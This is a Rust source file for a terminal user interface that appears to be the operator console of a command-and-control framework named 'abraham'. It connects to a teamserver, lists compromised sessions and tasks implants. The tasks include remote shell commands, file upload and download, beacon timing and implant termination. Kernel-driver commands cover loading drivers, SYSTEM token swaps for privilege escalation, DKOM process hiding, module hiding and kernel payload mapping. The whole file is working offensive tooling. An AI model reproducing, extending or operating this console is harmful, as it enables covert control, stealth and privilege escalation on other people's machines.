use anyhow::Result;
use ratatui::crossterm::event::{self, Event, KeyCode, KeyEventKind};
use ratatui::style::{Modifier, Style};
use ratatui::text::{Line, Span};
use ratatui::widgets::{Block, Borders, List, ListItem, Paragraph, Wrap};
use ratatui::DefaultTerminal;
use serde_json::{json, Value};
use std::io::{BufRead, BufReader, Write};
use std::net::TcpStream;
use std::time::{Duration, Instant};

const MGMT_DEFAULT: &str = "127.0.0.1:9000";
const REFRESH_INTERVAL: Duration = Duration::from_secs(2);
const MAX_LOG: usize = 500;

struct App {
    writer: TcpStream,
    reader: BufReader<TcpStream>,
    sessions: Vec<(u32, String)>,
    log: Vec<Line<'static>>,
    input: String,
}

impl App {
    fn connect(addr: &str) -> Result<Self> {
        let stream = TcpStream::connect(addr)?;
        stream.set_read_timeout(Some(Duration::from_secs(2)))?;
        stream.set_write_timeout(Some(Duration::from_secs(2)))?;
        let writer = stream.try_clone()?;
        let reader = BufReader::new(stream);
        Ok(App {
            writer,
            reader,
            sessions: Vec::new(),
            log: vec![Line::from("abraham tui — type 'help' for commands")],
            input: String::new(),
        })
    }

    fn push_log(&mut self, line: String) {
        if self.log.len() >= MAX_LOG {
            self.log.remove(0);
        }
        self.log.push(Line::from(line));
    }

    fn request(&mut self, request: Value) -> Option<Value> {
        let payload = match serde_json::to_string(&request) {
            Ok(mut s) => {
                s.push('\n');
                s
            }
            Err(_) => return None,
        };
        if self.writer.write_all(payload.as_bytes()).is_err() {
            return None;
        }
        let mut line = String::new();
        match self.reader.read_line(&mut line) {
            Ok(0) | Err(_) => None,
            Ok(_) => serde_json::from_str(line.trim()).ok(),
        }
    }

    fn refresh_sessions(&mut self) {
        if let Some(response) = self.request(json!({ "cmd": "sessions" })) {
            self.sessions.clear();
            if let Some(list) = response.get("sessions").and_then(|v| v.as_array()) {
                for entry in list {
                    let id = entry.get("id").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    let user = entry.get("user").and_then(|v| v.as_str()).unwrap_or("?");
                    let host = entry
                        .get("hostname")
                        .and_then(|v| v.as_str())
                        .unwrap_or("?");
                    let addr = entry.get("addr").and_then(|v| v.as_str()).unwrap_or("?");
                    self.sessions
                        .push((id, format!("{id}  {user}@{host}  {addr}")));
                }
            }
        }
    }

    fn submit(&mut self) {
        let line = self.input.trim().to_string();
        self.input.clear();
        if line.is_empty() {
            return;
        }
        let tokens: Vec<&str> = line.split_whitespace().collect();
        let response = match tokens.first().copied() {
            Some("help") => {
                self.push_log("commands:".into());
                self.push_log("  sessions                        refresh session list".into());
                self.push_log("  shell <id> <command...>         run command on session".into());
                self.push_log(
                    "  module <id> <name> [args...]     in-process module (ps/ls/cat/whoami)"
                        .into(),
                );
                self.push_log(
                    "  driver <id> load <svc> <src> <dst>   stage+start kernel driver (ABR-T013)"
                        .into(),
                );
                self.push_log(
                    "  driver <id> unload <svc> [dst]      stop+deregister+delete driver".into(),
                );
                self.push_log(
                    "  driver <id> probe [depth]           staged kernel read dry-runs (depths 1-7)".into(),
                );
                self.push_log(
                    "  driver <id> elevate                kernel-write proof: SYSTEM token swap + restore (ABR-T015)".into(),
                );
                self.push_log(
                    "  driver <id> gate                   capability survey + tier verdict".into(),
                );
                self.push_log(
                    "  driver <id> hide/unhide            DKOM process hiding with guarded restore (ABR-T016)".into(),
                );
                self.push_log(
                    "  driver <id> call                   kernel function calls via Nal driver (ABR-T017)".into(),
                );
                self.push_log("  upload <id> <local> <remote>    upload file to session".into());
                self.push_log(
                    "  download <id> <path>            download file from session".into(),
                );
                self.push_log("  sleep <id> <secs> <jitter>      update beacon timing".into());
                self.push_log("  results <id> [limit]            show task results".into());
                self.push_log("  exit <id>                       terminate implant".into());
                self.push_log("  quit                            leave the tui".into());
                None
            }
            Some("sessions") => {
                self.refresh_sessions();
                Some(json!({ "cmd": "sessions" }))
            }
            Some("shell") if tokens.len() >= 3 => {
                let id: u32 = tokens[1].parse().unwrap_or(0);
                let command = tokens[2..].join(" ");
                Some(json!({ "cmd": "shell", "session": id, "command": command }))
            }
            Some("module") if tokens.len() >= 3 => {
                let id: u32 = tokens[1].parse().unwrap_or(0);
                let name = tokens[2].to_string();
                let args = tokens[3..].join(" ");
                Some(json!({ "cmd": "module", "session": id, "name": name, "args": args }))
            }
            Some("driver") if tokens.len() == 6 && tokens[2] == "load" => {
                let id: u32 = tokens[1].parse().unwrap_or(0);
                Some(json!({
                    "cmd": "driver", "session": id, "action": "load",
                    "service": tokens[3], "source": tokens[4], "drop_path": tokens[5]
                }))
            }
            Some("driver") if tokens.len() >= 4 && tokens[2] == "unload" => {
                let id: u32 = tokens[1].parse().unwrap_or(0);
                Some(json!({
                    "cmd": "driver", "session": id, "action": "unload",
                    "service": tokens[3], "source": "",
                    "drop_path": tokens.get(4).unwrap_or(&"")
                }))
            }
            Some("driver") if tokens.len() >= 3 && tokens[2] == "probe" => {
                let id: u32 = tokens[1].parse().unwrap_or(0);
                let depth = tokens.get(3).copied().unwrap_or("");
                Some(json!({
                    "cmd": "driver", "session": id, "action": "probe",
                    "service": "", "source": depth, "drop_path": ""
                }))
            }
            // driver <id> map [payload.sys] — builtin proof payload when
            // the optional path is absent (ABR-T018).
            Some("driver") if tokens.len() >= 3 && tokens[2] == "map" => {
                let id: u32 = tokens[1].parse().unwrap_or(0);
                let payload = tokens.get(3).copied().unwrap_or("");
                Some(json!({
                    "cmd": "driver", "session": id, "action": "map",
                    "service": "", "source": payload, "drop_path": ""
                }))
            }
            // driver <id> modhide|modshow <name.sys> (ABR-T019).
            Some("driver") if tokens.len() == 4 && ["modhide", "modshow"].contains(&tokens[2]) => {
                let id: u32 = tokens[1].parse().unwrap_or(0);
                Some(json!({
                    "cmd": "driver", "session": id, "action": tokens[2],
                    "service": "", "source": tokens[3], "drop_path": ""
                }))
            }
            // driver <id> chan hb|ping|protect <pid>|unprotect|stop
            // (ABR-T021) - takes the rest of the line as subcommand.
            Some("driver") if tokens.len() >= 4 && tokens[2] == "chan" => {
                let id: u32 = tokens[1].parse().unwrap_or(0);
                let rest: Vec<&str> = tokens[3..].to_vec();
                Some(json!({
                    "cmd": "driver", "session": id, "action": "chan",
                    "service": "", "source": rest.join(" "), "drop_path": ""
                }))
            }
            // driver <id> protect on|off (ABR-T020).
            Some("driver") if tokens.len() == 4 && tokens[2] == "protect" => {
                let id: u32 = tokens[1].parse().unwrap_or(0);
                Some(json!({
                    "cmd": "driver", "session": id, "action": "protect",
                    "service": "", "source": tokens[3], "drop_path": ""
                }))
            }
            Some("driver")
                if tokens.len() == 3
                    && [
                        "elevate",
                        "gate",
                        "hide",
                        "unhide",
                        "call",
                        "call-preflight",
                    ]
                    .contains(&tokens[2]) =>
            {
                let id: u32 = tokens[1].parse().unwrap_or(0);
                Some(json!({
                    "cmd": "driver", "session": id, "action": tokens[2],
                    "service": "", "source": "", "drop_path": ""
                }))
            }
            Some("upload") if tokens.len() == 4 => {
                let id: u32 = tokens[1].parse().unwrap_or(0);
                Some(
                    json!({ "cmd": "upload", "session": id, "local": tokens[2], "remote": tokens[3] }),
                )
            }
            Some("download") if tokens.len() == 3 => {
                let id: u32 = tokens[1].parse().unwrap_or(0);
                Some(json!({ "cmd": "download", "session": id, "path": tokens[2] }))
            }
            Some("sleep") if tokens.len() == 4 => {
                let id: u32 = tokens[1].parse().unwrap_or(0);
                let secs: u64 = tokens[2].parse().unwrap_or(30);
                let jitter: f32 = tokens[3].parse().unwrap_or(0.25);
                Some(json!({ "cmd": "sleep", "session": id, "secs": secs, "jitter": jitter }))
            }
            Some("results") if tokens.len() >= 2 => {
                let id: u32 = tokens[1].parse().unwrap_or(0);
                let limit: usize = tokens.get(2).and_then(|t| t.parse().ok()).unwrap_or(20);
                Some(json!({ "cmd": "results", "session": id, "limit": limit }))
            }
            Some("exit") if tokens.len() == 2 => {
                let id: u32 = tokens[1].parse().unwrap_or(0);
                Some(json!({ "cmd": "exit", "session": id }))
            }
            Some("quit") => {
                self.push_log("use 'quit' via the Esc key".into());
                None
            }
            _ => {
                self.push_log(format!("unknown command: {line} (try 'help')"));
                None
            }
        };
        if let Some(request) = response {
            self.push_log(format!("> {line}"));
            match self.request(request) {
                Some(value) => {
                    let mut text = serde_json::to_string_pretty(&value).unwrap_or_default();
                    if text.len() > 4000 {
                        text.truncate(4000);
                        text.push_str("...");
                    }
                    for part in text.lines() {
                        self.push_log(part.to_string());
                    }
                }
                None => self.push_log("no response from teamserver".into()),
            }
        }
    }
}

fn ui(terminal_frame: &mut ratatui::Frame, app: &App) {
    use ratatui::layout::Constraint::{Length, Min};

    let chunks =
        ratatui::layout::Layout::vertical([Min(5), Min(8), Length(3)]).split(terminal_frame.area());

    let sessions: Vec<ListItem> = if app.sessions.is_empty() {
        vec![ListItem::new("no sessions")]
    } else {
        app.sessions
            .iter()
            .map(|(_, label)| ListItem::new(label.as_str()))
            .collect()
    };
    terminal_frame.render_widget(
        List::new(sessions).block(Block::new().borders(Borders::ALL).title("sessions")),
        chunks[0],
    );

    let visible: Vec<Line> = app.log.iter().rev().take(40).rev().cloned().collect();
    terminal_frame.render_widget(
        Paragraph::new(visible)
            .block(Block::new().borders(Borders::ALL).title("output"))
            .wrap(Wrap { trim: false }),
        chunks[1],
    );

    let hint = Span::styled(
        " esc: quit  |  enter: send",
        Style::new().add_modifier(Modifier::DIM),
    );
    let input = Line::from(vec![
        Span::styled("> ", Style::new().add_modifier(Modifier::BOLD)),
        Span::raw(app.input.clone()),
        hint,
    ]);
    terminal_frame.render_widget(
        Paragraph::new(input).block(Block::new().borders(Borders::ALL).title("input")),
        chunks[2],
    );
}

fn main() -> Result<()> {
    let addr = std::env::args()
        .nth(1)
        .unwrap_or_else(|| MGMT_DEFAULT.to_string());
    let mut app = App::connect(&addr)?;
    let mut terminal = ratatui::init();
    let result = run(&mut terminal, &mut app);
    ratatui::restore();
    result
}

fn run(terminal: &mut DefaultTerminal, app: &mut App) -> Result<()> {
    let mut last_refresh = Instant::now() - REFRESH_INTERVAL;
    loop {
        terminal.draw(|frame| ui(frame, app))?;
        if event::poll(Duration::from_millis(200))? {
            if let Event::Key(key) = event::read()? {
                if key.kind == KeyEventKind::Press {
                    match key.code {
                        KeyCode::Esc => return Ok(()),
                        KeyCode::Enter => app.submit(),
                        KeyCode::Backspace => {
                            app.input.pop();
                        }
                        KeyCode::Char(c) => app.input.push(c),
                        _ => {}
                    }
                }
            }
        }
        if last_refresh.elapsed() >= REFRESH_INTERVAL {
            app.refresh_sessions();
            last_refresh = Instant::now();
        }
    }
}
